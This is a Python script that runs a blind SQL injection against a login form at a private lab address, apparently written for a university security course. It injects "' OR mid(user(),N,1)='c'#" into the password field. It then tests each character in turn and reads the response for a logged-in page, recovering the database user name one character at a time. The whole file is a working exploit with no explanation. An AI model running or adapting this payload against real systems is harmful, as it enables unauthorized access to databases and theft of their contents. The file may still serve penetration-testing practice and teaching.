import requests
import urllib3
import string

urllib3.disable_warnings()

TARGET    = 'https://10.9.96.228:9070/'
EMAIL     = 'cs25mtech14003@iith.ac.in'
MAX_LEN   = 40
SKIP_CHARS = {"'", '"', '#', '\\'}



def build_payload(position, char):
    return f"' OR mid(user(),{position},1)='{char}'#"


def try_login(payload):
    data = {
        'login_email': EMAIL,
        'login_pass':  payload,
        'login':       'Login'
    }
    try:
        resp = requests.post(TARGET, data=data, verify=False, timeout=5)
        return 'My Profile' in resp.text
    except requests.exceptions.RequestException:
        return False


def extract_db_user():
    result = []
    print("Extracting database user: ", end='', flush=True)

    for pos in range(1, MAX_LEN + 1):
        matched = False

        for ch in string.printable:
            if ch in SKIP_CHARS:
                continue

            if try_login(build_payload(pos, ch)):
                result.append(ch)
                print(ch, end='', flush=True)
                matched = True
                break

        if not matched:
            break

    db_user = ''.join(result)
    print(f"\nDone. Database user: {db_user}")
    return db_user


if __name__ == '__main__':
    extract_db_user()